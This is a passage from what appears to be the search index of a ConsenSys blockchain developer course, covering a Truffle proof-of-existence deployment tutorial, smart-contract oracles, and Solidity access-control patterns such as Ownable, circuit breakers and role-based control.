contracts.","title":"Truffle Development Framework"},{"location":"S03-smart-contracts/M4-design-patterns/L10-proof-of-existence/#writing-the-smart-contract","text":"Run the following command in the terminal in your project directory: $ truffle create contract ProofOfExistence1 This command will create a Solidity file in the contracts directory called \u201cProofOfExistence1.sol\u201d and set up the boilerplate code for the contract, a contract definition along with a contract constructor. Open ProofOfExistence.sol in your text editor. Update your ProofOfExistence1.sol file so that it looks like this . We are starting with something simple, but incorrect and we are going to work towards a better contract. Our contract has a state and two functions. This contract actually has two different kinds of functions, a transactional function (notarize) and a read-only, or view , function (proofFor). Transactional functions can modify state whereas constant functions can only read the state and return values. Let\u2019s deploy this contract to our test network. Create a new migrations file in the migrations directory called 2_deploy_contracts.js. In this file add the following: const ProofOfExistence1 = artifacts . require ( './ProofOfExistence1.sol' ); module . exports = function ( deployer ) { deployer . deploy ( ProofOfExistence1 ); }; This script tells Truffle to get the contract information from ProofOfExitence.sol and deploy it to the specified network. Now we just need to tell Truffle to run the deployment. Run the following command in the terminal in your project directory: $ truffle migrate In the terminal output you should see that Truffle compiled ProofOfExistence.sol and printed some warning regarding the contract. Then it runs the migrations using the network \u2018development\u2019 that we specified in truffle-config.js. Truffle remembers which contracts it has migrated to the network, so if we want to run the migration again on the same network, we need to use the --reset option like so: $ truffle migrate --reset You can find more information about truffle migrations here .","title":"Writing the Smart Contract"},{"location":"S03-smart-contracts/M4-design-patterns/L10-proof-of-existence/#interacting-with-your-smart-contract","text":"Our contract is now on the development blockchain, so we can interact with it. We can read the contract state from the blockchain and update the state by calling the notarize function. We can do this using the Truffle console. Bring up the truffle console with the command: $ truffle console You should see truffle(development)> On the first line enter: const poe = await ProofOfExistence1 . at ( ProofOfExistence1 . address ) This line says that the variable \u201cpoe\u201d is an instance of ProofOfExistence1.sol found at the address that we just deployed. You can see the address by entering truffle(development)> poe.address '0xc490df1850010ea8146c1dd3e961fedbf6b85bef' To call the notarize function, we call it like any other javascript function. truffle(development)> poe.notarize('Hello World!') { tx: '0x60ae...2643cbea65', receipt: \u2026 } This function causes a state change, so it is a transactional function. Transactional functions return a Promise that resolves to a transaction object. We can get the proof for the string with truffle(development)> poe.proofFor('Hello World!') \u20180x7f83b...126d9069\u2019 And check that the contract\u2019s state was correctly changed truffle(development)> poe.proof() '0x7f83b...126d9069' The hashes match!","title":"Interacting with your Smart Contract"},{"location":"S03-smart-contracts/M4-design-patterns/L10-proof-of-existence/#iterating-the-code","text":"Our contract works! But it can only store one proof at a time. Let\u2019s change that. Exit the Truffle console and create a new file called ProofOfExistence2.sol: truffle ( development ) > . exit $ truffle create contract ProofOfExistence2 Update the ProofOfExistence2 contract to match this contract . The main changes between the first version and this version are that we changed the \u201cproof\u201d variable to a bytes32 array called \u201cproofs\u201d and made it private. We also added a function called \u201chasProof\u201d to check if a proof has already been stored in the array. Update the migration script 2_deploy_contracts.js to deploy the new contract and deploy it to the development blockchain. $ truffle migrate --reset Launch the console to interact with the new contract. $ truffle console Save the deployed contract truffle ( development ) > const poe = await ProofOfExistence2 . at ( ProofOfExistence2 . address ) We can check for a proof. truffle(development)> poe.checkDocument('Hello World!') false It returns false because we haven\u2019t added anything yet. Let\u2019s do that now. truffle(development)> poe.notarize('Hello World!') { tx: '0xd6f72...10a6e', receipt: { transactionHash: ... logs: [] } truffle(development)> poe.checkDocument('Hello World!') true We can check to make sure that our contract will store multiple proofs. truffle(development)> poe.notarize('Hello Consensys!') { tx: '0x8b566...091ace', receipt: { transactionHash: ... logs: [] } truffle(development)> poe.checkDocument('Hello Consensys!') True Looping over arrays in smart contracts can get expensive as arrays get longer. Using a mapping is a better solution. Let\u2019s create a final version in ProofOfExistence3.sol using mappings. You can use this code for the contract. Modify the deployment script to deploy the new contract and test it in the console to make sure that it behaves just like ProofOfExistence2.sol.","title":"Iterating the code"},{"location":"S03-smart-contracts/M4-design-patterns/L10-proof-of-existence/#deploying-to-the-testnet","text":"From here, we are going to deviate from the Zeppelin Solutions walkthrough. If you want to learn how to deploy contracts using the geth console (which requires syncing with the testnet), you can consult the Zeppelin Solutions walkthrough. The first step in our alternate deployment method is to get an Ethereum account on Metamask. On the landing page, click \u201cGet Chrome Extension.\u201d Once the extension is installed, accept the terms of use and enter a password for your account. You will be shown 12 words that can be used to restore your wallet. A word of caution, do NOT publish these words anywhere public. Anyone that has these 12 words has access to your wallet. Save these 12 words in a file called '.secret' in your project directory. Note: They do not need to be contained within a string when adding to .secret, line 25 in truffle config assists with this detail. With Truffle version 5, the truffle-config.js file comes populated with a lot of configuration settings that are commented out. // truffle - config . js 21 const HDWallet = require ( '@truffle/hdwallet-provider' ); 22 const infuraURL = 'https://rinkeby.infura.io/v3/<Project_ID>' <-- project id here 23 24 const fs = require ( 'fs' ); 25 const mnemonic = fs . readFileSync ( '.secret' ) . toString () . trim (); Uncomment lines 21 - 25. Line 21 will import the tool to derive a private key and address from a mnemonic. Entering your Infura API key in line 22 will allow you to easily deploy contracts to Ethereum (we will cover how to get an API key shortly). Lines 24 and 25 will import your seed phrase (from the .secret file) into the file. Truffle will use these words to access your wallet and deploy the contract. Deploying the contract requires us to make a transaction on the testnet, so we need some ether to pay for the transaction. You can get free Rinkeby ether by going to this website and following the instructions. Make sure you enter the Ethereum address for your 1st Metamask account. Now that we have a testnet account with Ether, we need to configure Truffle to be able to deploy the contract. To deploy contracts to the testnet using Truffle without having to sync a local node, you can use Infura. Infura allows you to access a fully synced Ethereum node via their API. We will use their API to deploy our contracts to the Rinkeby testnet. Go to the Infura website and sign up for a free account. Save the Rinkeby test network URL that Infura provides in a variable called infuraURL in truffle-config.js. Your Project ID is a unique code provided by Infura. // truffle - config . js const infuraURL = 'https://rinkeby.infura.io/v3/<Project_ID>' <-- project id here For Truffle to derive our ethereum address from the mnemonic, we need to install the Truffle HD wallet provider. In the terminal located in the proof-of-existence project root run: npm install @truffle / hdwallet - provider And import the HD wallet provider into your truffle-config.js file, ensure you have the following. const HDWallet = require ( '@truffle/hdwallet-provider' ) Now we just need to add the rinkeby network configuration to the networks object in truffle-config.js module.exports. Change the module.exports object to resemble this: networks: { development: { host: 'localhost', port: 8545, network_id: '*' }, rinkeby: { provider: () => new HDWalletProvider(mnemonic, infuraURL), network_id: 4, // Rinkeby's network id gas: 5500000, }, } Where the \u201cmnemonic\u201d variable is the 12 word seed phrase that you saved from metamask and the \u201cinfuraKey\u201d variable is your Infura Project ID. You just have to run \u201ctruffle migrate\u201d for the correct network and your contract will be deployed! $ truffle migrate --network rinkeby Starting migrations... ====================== > Network name: 'rinkeby' > Network id: 4 > Block gas limit: 7602728 1_initial_migration.js ====================== Deploying 'Migrations' ---------------------- > transaction hash: 0x6c5cc0090db1147dfadfd4a84280715e8e8bb3bb820401e32ea40b4f6e521178 > Blocks: 0 Seconds: 12 > contract address: 0x8e8786683C33147dA500c3F54A9690A4f81a3D48 > account: 0x196150D99a325f624F7c420Cf80ca6ab9a1BeDBA > balance: 0 .987611032134329654 > gas used: 284908 > gas price: 20 gwei > value sent: 0 ETH > total cost: 0 .00569816 ETH > Saving migration to chain. > Saving artifacts ------------------------------------- > Total cost: 0 .00569816 ETH 2_deploy_contracts.js ===================== Deploying 'ProofOfExistence2' ----------------------------- > transaction hash: 0x4692cc0311571c70f7d425f9a89702a355abe8345961c871980a279c8b16e20a > Blocks: 1 Seconds: 12 > contract address: 0x096c0636F39372Fa83EF498bCC5Bce86C8fd1Fb5 > account: 0x196150D99a325f624F7c420Cf80ca6ab9a1BeDBA > balance: 0 .978713032134329654 > gas used: 402866 > gas price: 20 gwei > value sent: 0 ETH > total cost: 0 .00805732 ETH > Saving migration to chain. > Saving artifacts ------------------------------------- > Total cost: 0 .00805732 ETH Summary ======= > Total deployments: 2 > Final cost: 0 .01375548 ETH The terminal prints the addresses of the deployed contracts as well as the transaction hashes of the deployment transactions. This information can also be referenced in the contract artifacts, which are stored in proof-of-existence/build/contracts/. Deployment information is found at the bottom of each JSON file. You can view your deployed contracts at https://rinkeby.etherscan.io/ and paste in the deployed contract address to have a look you yourself, you can now interact with the deployed contract on the Rinkeby test network!","title":"Deploying to the Testnet"},{"location":"S03-smart-contracts/M4-design-patterns/L2-inter-contract-execution/","text":"Currently on LMS This content is a video hosted on courses.consensys.net (for now)","title":"Index"},{"location":"S03-smart-contracts/M4-design-patterns/L2-inter-contract-execution/#currently-on-lms","text":"This content is a video hosted on courses.consensys.net (for now)","title":"Currently on LMS"},{"location":"S03-smart-contracts/M4-design-patterns/L3-inheritance-and-interfaces/","text":"Currently on LMS This content is a video hosted on courses.consensys.net (for now)","title":"Index"},{"location":"S03-smart-contracts/M4-design-patterns/L3-inheritance-and-interfaces/#currently-on-lms","text":"This content is a video hosted on courses.consensys.net (for now)","title":"Currently on LMS"},{"location":"S03-smart-contracts/M4-design-patterns/L4-oracles/","text":"Oracles In our discussion blockchain primitives, we discussed how public blockchain networks coordinate these powerful tools to create a network state that can be established and maintained by network participants. However, that network state only holds true within the boundaries of the network itself. We can only guarantee the state transitions of the network participants running our blockchain client software. What about data that exists outside this network, specifically what about \"real world\" data, such as weather reports, incident details or stock prices? Additionally, what if we'd like to interact with external computation in the outside world? A machine learning algorithm, a random number generator, or an event-driven task automation would all be examples of external computation that would be essential to building feature rich smart contracts. Such data and external computation exist but they are beyond the trust boundary established by our blockchain protocols. One way blockchain developers have tried to bridge the gap is through what are called off-chain oracles. Off-chain oracles are agents that find and verify real-world information and submit them to the blockchain to be used by smart contracts. They can trigger smart contract executions when the data is obtained or predefined conditions are meet (e.g. time, weather, tracking, payments). Off-chain oracles are provided by organizations like Provable Things , Chainlink Labs, and more. Please note that DeFi has led to on-chain oracles, particularly dealing with token prices, which we will discuss more in the section on DeFi. Such examples of on-chain oracles are Chainlink's Data Feeds , Uniswap's Observations , and MakerDAO's Feeds . A smart contract using oracles in some facet is often referred to as a Hybrid Smart Contract . Trust It's extremely important to understand oracles like the ones we're discussing here can require trust. Understanding where the data is coming from is essential to running a decentralized smart contract. When using oracles, it's important to build in smart contract mechanisms that can anticipate errors or possible corruption, as oracles can succumb to many attack vectors. Having a single oracle or a single data source delivering your data or executing your computation creates a single source of failure for your smart contract, and means your decentralized application isn't actually decentralized. You'll want to make sure the oracle network you're working with is executing in a context as decentralized as possible. For example, if you want pricing data, you get the pricing data from many exchanges, and many independent blockchain oracles deliver this data. It's important to know, that just setting up an oracle service yourself can mean your application is centralized, and possibly doesn't have the highest quality data or execution. So we want to avoid setting these up ourselves, but also do our due diligence to make sure the system we are working with is decentralized. Services such as Chainlink have built more decentralized networks to hedge against the centralization of trust, you can read more about how Chainlink does that here and see an overview of decentralized oracles here. Basic Oracle Mechanism At its most basic, a smart contract using an oracle needs to implement a method to: Make the request to the oracle, and Receive the oracle's response from a callback method This is often known as the request and receive model of oracles. Unless you've setup the service yourself, external calls to oracles typically require a fee attached to provide the data to your contract. There are multiple ways to achieve this; let's look at a simplified version of this example using Provable below: import \"github.com/provable-things/ethereum-api/provableAPI.sol\"; contract DieselPrice is usingProvable { uint dieselPriceUSD; constructor() public { provable_query(\"URL\", \"xml(https://www.fueleconomy.gov/ws/rest/fuelprices).fuelPrices.diesel\"); } function __callback (bytes32 myid, string result) public { require(msg.sender == provable_cbAddress()); dieselPriceUSD = parseInt(result); } } In this code, we're calling the Provable API for the price of diesel when we create the contract. The first query is free, but we'll have to provide ETH to pay for our requests moving forward. The call triggers an event, which lets the Provable contract pull from its off-chain data feed and provide our contract the result. The contract stores that value in dieselPriceUSD . The overall model is for your contract to emit an event, either to another contract or simply in the block its created. The oracle service will detect that event, pull the desired data, and respond back to your contract. The oracle services require you to have a standard method, like __callback , that its transaction can target when responding to your oracle query. Decentralized Oracle Mechanism In the above example, we looked at pulling data from a single source and provider. Stringing requests like this together can make us have a more decentralized application, but we would still be routing it through the same organization. Let's look at another example of pulling data in a decentralized context, for example, from a Chainlink data feed. You can see the most up to date version of this code in the Chainlink documentation. pragma solidity ^0.6.7; import \"@chainlink/contracts/src/v0.6/interfaces/AggregatorV3Interface.sol\"; contract PriceConsumerV3 { AggregatorV3Interface internal priceFeed; /** * Network: Kovan * Aggregator: ETH/USD * Address: 0x9326BFA02ADD2366b30bacB125260Af641031331 */ constructor() public { priceFeed = AggregatorV3Interface(0x9326BFA02ADD2366b30bacB125260Af641031331); } /** * Returns the latest price */ function getThePrice() public view returns (int) { ( uint80 roundID, int price, uint startedAt, uint timeStamp, uint80 answeredInRound ) = priceFeed.latestRoundData(); return price; } } In this example, we are pulling the price of Ethereum in terms of the United States Dollar into our smart contract. We do this by querying another contract that has already followed the basic request model among many different oracles and data providers. It's important that the network is using different data providers and oracles so that there is never a single authority point. You can see a visualization of this contract and the different nodes gathering the data for them at data.chain.link. Summary The oracle ecosystem is growing as fast as blockchain, and we'll touch on it more later in the course. For now, it's important to see how oracles allow us to cross the \"trust boundary\" of blockchains, what trust assumptions that requires, and the basic design pattern for incorporating this data stream. Additional Material Wiki: Oracles (Ethereum.org) A great overview of oracles on Ethereum with demo code for Chainlink Wikipedia: Blockchain Oracle Docs: Chainlink A really well-curated series of docs outline how to get started with Chainlink and the different services and networks available. Tutorial: Implementing a Blockchain Oracle on Ethereum * Code: Provable Things Ethereum Examples A collection of examples from Provable Things, a bit dated but can still provide a source of reference. * Academic Article: A Study of Blockchain Oracles A technical examination of blockchain oracles referenced in the blockchain oracles Wikipedia page. * Article: So You Want to Use a Price Oracle Interesting article (albeit about on-chain oracles) discussing attack vectors.","title":"Oracles"},{"location":"S03-smart-contracts/M4-design-patterns/L4-oracles/#oracles","text":"In our discussion blockchain primitives, we discussed how public blockchain networks coordinate these powerful tools to create a network state that can be established and maintained by network participants. However, that network state only holds true within the boundaries of the network itself. We can only guarantee the state transitions of the network participants running our blockchain client software. What about data that exists outside this network, specifically what about \"real world\" data, such as weather reports, incident details or stock prices? Additionally, what if we'd like to interact with external computation in the outside world? A machine learning algorithm, a random number generator, or an event-driven task automation would all be examples of external computation that would be essential to building feature rich smart contracts. Such data and external computation exist but they are beyond the trust boundary established by our blockchain protocols. One way blockchain developers have tried to bridge the gap is through what are called off-chain oracles. Off-chain oracles are agents that find and verify real-world information and submit them to the blockchain to be used by smart contracts. They can trigger smart contract executions when the data is obtained or predefined conditions are meet (e.g. time, weather, tracking, payments). Off-chain oracles are provided by organizations like Provable Things , Chainlink Labs, and more. Please note that DeFi has led to on-chain oracles, particularly dealing with token prices, which we will discuss more in the section on DeFi. Such examples of on-chain oracles are Chainlink's Data Feeds , Uniswap's Observations , and MakerDAO's Feeds . A smart contract using oracles in some facet is often referred to as a Hybrid Smart Contract .","title":"Oracles"},{"location":"S03-smart-contracts/M4-design-patterns/L4-oracles/#trust","text":"It's extremely important to understand oracles like the ones we're discussing here can require trust. Understanding where the data is coming from is essential to running a decentralized smart contract. When using oracles, it's important to build in smart contract mechanisms that can anticipate errors or possible corruption, as oracles can succumb to many attack vectors. Having a single oracle or a single data source delivering your data or executing your computation creates a single source of failure for your smart contract, and means your decentralized application isn't actually decentralized. You'll want to make sure the oracle network you're working with is executing in a context as decentralized as possible. For example, if you want pricing data, you get the pricing data from many exchanges, and many independent blockchain oracles deliver this data. It's important to know, that just setting up an oracle service yourself can mean your application is centralized, and possibly doesn't have the highest quality data or execution. So we want to avoid setting these up ourselves, but also do our due diligence to make sure the system we are working with is decentralized. Services such as Chainlink have built more decentralized networks to hedge against the centralization of trust, you can read more about how Chainlink does that here and see an overview of decentralized oracles here.","title":"Trust"},{"location":"S03-smart-contracts/M4-design-patterns/L4-oracles/#basic-oracle-mechanism","text":"At its most basic, a smart contract using an oracle needs to implement a method to: Make the request to the oracle, and Receive the oracle's response from a callback method This is often known as the request and receive model of oracles. Unless you've setup the service yourself, external calls to oracles typically require a fee attached to provide the data to your contract. There are multiple ways to achieve this; let's look at a simplified version of this example using Provable below: import \"github.com/provable-things/ethereum-api/provableAPI.sol\"; contract DieselPrice is usingProvable { uint dieselPriceUSD; constructor() public { provable_query(\"URL\", \"xml(https://www.fueleconomy.gov/ws/rest/fuelprices).fuelPrices.diesel\"); } function __callback (bytes32 myid, string result) public { require(msg.sender == provable_cbAddress()); dieselPriceUSD = parseInt(result); } } In this code, we're calling the Provable API for the price of diesel when we create the contract. The first query is free, but we'll have to provide ETH to pay for our requests moving forward. The call triggers an event, which lets the Provable contract pull from its off-chain data feed and provide our contract the result. The contract stores that value in dieselPriceUSD . The overall model is for your contract to emit an event, either to another contract or simply in the block its created. The oracle service will detect that event, pull the desired data, and respond back to your contract. The oracle services require you to have a standard method, like __callback , that its transaction can target when responding to your oracle query.","title":"Basic Oracle Mechanism"},{"location":"S03-smart-contracts/M4-design-patterns/L4-oracles/#decentralized-oracle-mechanism","text":"In the above example, we looked at pulling data from a single source and provider. Stringing requests like this together can make us have a more decentralized application, but we would still be routing it through the same organization. Let's look at another example of pulling data in a decentralized context, for example, from a Chainlink data feed. You can see the most up to date version of this code in the Chainlink documentation. pragma solidity ^0.6.7; import \"@chainlink/contracts/src/v0.6/interfaces/AggregatorV3Interface.sol\"; contract PriceConsumerV3 { AggregatorV3Interface internal priceFeed; /** * Network: Kovan * Aggregator: ETH/USD * Address: 0x9326BFA02ADD2366b30bacB125260Af641031331 */ constructor() public { priceFeed = AggregatorV3Interface(0x9326BFA02ADD2366b30bacB125260Af641031331); } /** * Returns the latest price */ function getThePrice() public view returns (int) { ( uint80 roundID, int price, uint startedAt, uint timeStamp, uint80 answeredInRound ) = priceFeed.latestRoundData(); return price; } } In this example, we are pulling the price of Ethereum in terms of the United States Dollar into our smart contract. We do this by querying another contract that has already followed the basic request model among many different oracles and data providers. It's important that the network is using different data providers and oracles so that there is never a single authority point. You can see a visualization of this contract and the different nodes gathering the data for them at data.chain.link.","title":"Decentralized Oracle Mechanism"},{"location":"S03-smart-contracts/M4-design-patterns/L4-oracles/#summary","text":"The oracle ecosystem is growing as fast as blockchain, and we'll touch on it more later in the course. For now, it's important to see how oracles allow us to cross the \"trust boundary\" of blockchains, what trust assumptions that requires, and the basic design pattern for incorporating this data stream.","title":"Summary"},{"location":"S03-smart-contracts/M4-design-patterns/L4-oracles/#additional-material","text":"Wiki: Oracles (Ethereum.org) A great overview of oracles on Ethereum with demo code for Chainlink Wikipedia: Blockchain Oracle Docs: Chainlink A really well-curated series of docs outline how to get started with Chainlink and the different services and networks available. Tutorial: Implementing a Blockchain Oracle on Ethereum * Code: Provable Things Ethereum Examples A collection of examples from Provable Things, a bit dated but can still provide a source of reference. * Academic Article: A Study of Blockchain Oracles A technical examination of blockchain oracles referenced in the blockchain oracles Wikipedia page. * Article: So You Want to Use a Price Oracle Interesting article (albeit about on-chain oracles) discussing attack vectors.","title":"Additional Material"},{"location":"S03-smart-contracts/M4-design-patterns/L5-access-control/","text":"Access Control Design Patterns Access Control is a broad term. Most generally, it means who is allowed to do what on your smart contract. Who is allowed to mint new tokens, create a new pointer contract or release funds, for example. We'll be looking at Access Control from a Solidity and coding standpoint, but Access Control is actually a pivot point where the blockchain enters the real world. In the following examples, we'll write code to allow a certain address to do (or not do) a certain action. However, address may correspond to a user in the real world, granting them certain privileges over the contract. If that contract holds the funds for a group, that person is now the treasurer of the group! Keep this in mind as we go through these different examples and a teaser for our later sections on DAOs. Restricting Access and Ownable A very simple form of access control is making contract state private. You cannot prevent people or computer programs from reading your contracts\u2019 state. The state is publicly available information for anyone with access to the blockchain. However, you can restrict other contracts\u2019 access to the state by making state variables private, like in the basic example below: contract C1 { uint private internalNum; } This simple typing can provide some aspect of security through access control. A broader form of access control is the Ownable design pattern, the \"Hello, World!\" of access control, you might say. It designates a certain address, or addresses, as the \"owner\" or admin of the contract. As we learned earlier, function modifiers allow us to reuse code and increase contract readability. We can also use them to restrict access based on the Ownable model: address owner ; constructor () payable public { owner = msg . sender ; } modifier onlyOwner () { require ( msg . sender == owner , \"Not authorized.\" ); _ ; } function withdraw ( uint _amount ) onlyOwner public { owner . transfer ( _amount ); } The above code declares the variable owner and assigns that role to whoever is creating the contract, using the msg.sender global variable. We then declare a modifier onlyOwner() , which establishes a security check at the top of each function we assign it. Using the modifier syntax, we require a check of the identity of the transaction sender to see if it matches the declared owner . We then place this modifier in front of whichever functions we want to restrict access to. In this case, we're adding it to the withdraw() function (which makes sense, as we don't want anyone to be able to drain our contract of value!). This makes it so that the only user who can access this specific function is owner , all other addresses will fail. A common contract used for this is OpenZeppelin's Ownable.sol , which also lets you transferOwnership to another user or renounceOwnership if your contract only requires central authority for a certain period of time. Please note that the Ownable pattern is a bit fragile: it can become a single point of failure and is not very sophisticated in terms of Access Control. Pausable Another form of access control has to do with turning the smart contract itself into a state machine. As we mentioned earlier in the distributed consensus section, a state machine can be in one of a finite number of states at any time. To make the smart contract a state machine, we'll use the enum variable type to create a series of possible states. To have access control, we'll then assign only certain functions to run when the contract is in a certain state. Here's what this looks like in Solidity, where the possible states are Deposits and Withdraws and the state changes after a time of 30 days from the contract's creationTime : enum Stages { Deposits , Withdraws } Stages stage = Stages . Deposits ; mapping ( address => uint ) balances ; uint creationTime = now ; function deposit () payable public { require ( stage == Stages . Deposits && msg . value > 0 ); balances [ msg . sender ] += msg . value ; } function withdraw () public { if ( stage != Stages . Withdraws && now >= creationTime + 30 days ) { stage = Stages . Withdraws ; } require ( stage == Stages . Withdraws && balances [ msg . sender ] > 0 ); uint amount = balances [ msg . sender ]; balances [ msg . sender ] = 0 ; msg . sender . transfer ( amount ); } The deposit() function can only be called when the stage enum is in Deposits . After 30 days has passed, the contract transitions into Withdraws whenever someone calls withdraw() . For an example of this example, \"The DAO\" contract required 27 days between a successful request to split the DAO and the ability to do so. This ensured the funds were kept within the contract, increasing the likelihood of recovery. We have another example of this form of access control with the Circuit Breaker design pattern, also called Emergency Stop or Pausable. Circuit Breakers are design patterns that allow contract functionality to be stopped. This would be desirable in situations where there is a live contract where a bug has been detected. Freezing the contract would be beneficial for reducing harm before a fix can be implemented. Here's what it looks like in Solidity: contract CircuitBreaker { bool public stopped = false; modifier stopInEmergency { require(!stopped); _; } modifier onlyInEmergency { require(stopped); _; } function deposit() stopInEmergency public { \u2026 } function withdraw() onlyInEmergency public { \u2026 } } Circuit breaker contracts can be set up to permit certain functions in certain situations. For example, if you are implementing a withdrawal pattern, you might want to stop people from depositing funds into the contract if a bug has been detected, while still allowing accounts with balances to withdraw their funds. In a situation such as this, you would also want to restrict access to the accounts that can modify the stopped state variable, maybe to the contract owner (such as multisig wallet) or a set of admins. Here's another example, with three separate states that dictate certain rules to be followed: bool isStopped = false ; address owner ; constructor () payable public { owner = msg . sender ; } function stopContract () public { require ( msg . sender == owner ); isStopped = true ; } function resumeContract () public { require ( msg . sender == owner ) isStopped = false ; } function emergencyWithdraw () public { require ( msg . sender == owner && isStopped ); owner . transfer ( this . balance ); } Role-Based Access Control Role-based access control is a more layered approach to access control to meet the more varied demands of a smart contract or application. It follows a similar trend in software development access: Certain individuals are administrators, others are contributors, others can just view the code. OpenZeppelin advocates using their role-based access control library, [Roles.sol,](https://docs.openzeppelin.com/contracts/2.x/api/access#Roles){target=_blank} instead of Ownable.sol . They've also implemented roles-based access control in contracts, such as ERC20Mintable.sol, which has a MinterRole allowed to create new tokens. You can read more about their approach to role-based access control in this post here. Role-based access control can be critical to developing code-based governance, such as in a DAO. Keep this design pattern in mind when we discuss DAOs later! Additional Resources Wiki: Access Control A comprehensive article from OpenZeppelin about Access Control design patterns and how contracts in their repository enacts different patterns. Code: OpenZeppelin's Ownable.sol Code: OpenZeppelin's Pausable.sol","title":"Index"},{"location":"S03-smart-contracts/M4-design-patterns/L5-access-control/#access-control-design-patterns","text":"Access Control is a broad term. Most generally, it means who is allowed to do what on your smart contract. Who is allowed to mint new tokens, create a new pointer contract or release funds, for example. We'll be looking at Access Control from a Solidity and coding standpoint, but Access Control is actually a pivot point where the blockchain enters the real world. In the following examples, we'll write code to allow a certain address to do (or not do) a certain action. However, address may correspond to a user in the real world, granting them certain privileges over the contract. If that contract holds the funds for a group, that person is now the treasurer of the group! Keep this in mind as we go through these different examples and a teaser for our later sections on DAOs.","title":"Access Control Design Patterns"},{"location":"S03-smart-contracts/M4-design-patterns/L5-access-control/#restricting-access-and-ownable","text":"A very simple form of access control is making contract state private. You cannot prevent people or computer programs from reading your contracts\u2019 state. The state is publicly available information for anyone with access to the blockchain. However, you can restrict other contracts\u2019 access to the state by making state variables private, like in the basic example below: contract C1 { uint private internalNum; } This simple typing can provide some aspect of security through access control. A broader form of access control is the Ownable design pattern, the \"Hello, World!\" of access control, you might say. It designates a certain address, or addresses, as the \"owner\" or admin of the contract. As we learned earlier, function modifiers allow us to reuse code and increase contract readability. We can also use them to restrict access based on the Ownable model: address owner ; constructor () payable public { owner = msg . sender ; } modifier onlyOwner () { require ( msg . sender == owner , \"Not authorized.\" ); _ ; } function withdraw ( uint _amount ) onlyOwner public { owner . transfer ( _amount ); } The above code declares the variable owner and assigns that role to whoever is creating the contract, using the msg.sender global variable. We then declare a modifier onlyOwner() , which establishes a security check at the top of each function we assign it. Using the modifier syntax, we require a check of the identity of the transaction sender to see if it matches the declared owner . We then place this modifier in front of whichever functions we want to restrict access to. In this case, we're adding it to the withdraw() function (which makes sense, as we don't want anyone to be able to drain our contract of value!). This makes it so that the only user who can access this specific function is owner , all other addresses will fail. A common contract used for this is OpenZeppelin's Ownable.sol , which also lets you transferOwnership to another user or renounceOwnership if your contract only requires central authority for a certain period of time. Please note that the Ownable pattern is a bit fragile: it can become a single point of failure and is not very sophisticated in terms of Access Control.","title":"Restricting Access and Ownable"},{"location":"S03-smart-contracts/M4-design-patterns/L5-access-control/#pausable","text":"Another form of access control has to do with turning the smart contract itself into a state machine. As we mentioned earlier in the distributed consensus section, a state machine can be in one of a finite number of states at any time. To make the smart contract a state machine, we'll use the enum variable type to create a series of possible states. To have access control, we'll then assign only certain functions to run when the contract is in a certain state. Here's what this looks like in Solidity, where the possible states are Deposits and Withdraws and the state changes after a time of 30 days from the contract's creationTime : enum Stages { Deposits , Withdraws } Stages stage = Stages . Deposits ; mapping ( address => uint ) balances ; uint creationTime = now ; function deposit () payable public { require ( stage == Stages . Deposits && msg . value > 0 ); balances [ msg . sender ] += msg . value ; } function withdraw () public { if ( stage != Stages . Withdraws && now >= creationTime + 30 days ) { stage = Stages . Withdraws ; } require ( stage == Stages . Withdraws && balances [ msg . sender ] > 0 ); uint amount = balances [ msg . sender ]; balances [ msg . sender ] = 0 ; msg . sender . transfer ( amount ); } The deposit() function can only be called when the stage enum is in Deposits . After 30 days has passed, the contract transitions into Withdraws whenever someone calls withdraw() . For an example of this example, \"The DAO\" contract required 27 days between a successful request to split the DAO and the ability to do so. This ensured the funds were kept within the contract, increasing the likelihood of recovery. We have another example of this form of access control with the Circuit Breaker design pattern, also called Emergency Stop or Pausable. Circuit Breakers are design patterns that allow contract functionality to be stopped. This would be desirable in situations where there is a live contract where a bug has been detected. Freezing the contract would be beneficial for reducing harm before a fix can be implemented. Here's what it looks like in Solidity: contract CircuitBreaker { bool public stopped = false; modifier stopInEmergency { require(!stopped); _; } modifier onlyInEmergency { require(stopped); _; } function deposit() stopInEmergency public { \u2026 } function withdraw() onlyInEmergency public { \u2026 } } Circuit breaker contracts can be set up to permit certain functions in certain situations. For example, if you are implementing a withdrawal pattern, you might want to stop people from depositing funds into the contract if a bug has been detected, while still allowing accounts with balances to withdraw their funds. In a situation such as this, you would also want to restrict access to the accounts that can modify the stopped state variable, maybe to the contract owner (such as multisig wallet) or a set of admins. Here's another example, with three separate states that dictate certain rules to be followed: bool isStopped = false ; address owner ; constructor () payable public { owner = msg . sender ; } function stopContract () public { require ( msg . sender == owner ); isStopped = true ; } function resumeContract () public { require ( msg . sender == owner ) isStopped = false ; } function emergencyWithdraw () public { require ( msg . sender == owner && isStopped ); owner . transfer ( this . balance ); }","title":"Pausable"},{"location":"S03-smart-contracts/M4-design-patterns/L5-access-control/#role-based-access-control","text":"Role-based access control is a more layered approach to access control to meet the more varied demands of a smart contract or application. It follows a similar trend in software development access: Certain individuals are administrators, others are contributors, others can just view the code. OpenZeppelin advocates using their role-based access control library, [Roles.sol,](https://docs.openzeppelin.com/contracts/2.x/api/access#Roles){target=_blank} instead of Ownable.sol . They've also implemented roles-based access control in contracts, such as ERC20Mintable.sol, which has a MinterRole allowed to create new tokens. You can read more about their approach to role-based access control in this post here. Role-based access control can be critical to developing code-based governance, such as in a DAO. Keep this design pattern in mind when we discuss DAOs later!","title":"Role-Based Access Control"},{"location":"S03-smart-contracts/M4-design-patterns/L5-access-control/#additional-resources","text":"Wiki: Access Control A comprehensive article from OpenZeppelin about Access Control design patterns and how contracts in their repository enacts different patterns. Code: OpenZeppelin's Ownable.sol Code: OpenZeppelin's Pausable.sol","title":"Additional Resources"},{"location":"S03-smart-contracts/M4-design-patterns/L6-general-finance/","text":"General Finance: Multi-Sig This section is a tutorial setting up a Multi-Sig contract, which functions as a store of value (it's called a \"wallet\" in the traditional sense of something that holds money, not a crypto-wallet like MetaMask). It is based on this project by Nate Rush. The solution is based on this MultiSignature Wallet found in the ConsenSys github repository. You can find the GitHub repository for this exercise here . What is a Multi-signature wallet? A multi-signature wallet is an account that requires some m-of-n quorum of approved private keys to approve a transaction before it is executed. In Ethereum, multi-signature wallets are implemented as a smart contract, that each of the approved external accounts sends a transaction to in order to \"sign\" a group transaction. Following this project spec designed by the UPenn Blockchain Club, you will now create your own multisignature wallet contract. Note: It is not suggested that you use this multisignature wallet with any real funds, but rather use a far more deeply audited one such as the Gnosis multisignature wallet. Project Setup Clone this GitHub repository. The MultiSignatureWallet.sol file in the contracts directory has the structure of a multisignature wallet that you will be implementing. Implementing the Contract Copy the contents of the MultiSignatureWallet.sol file found in the project directory into Remix, Truffle, or 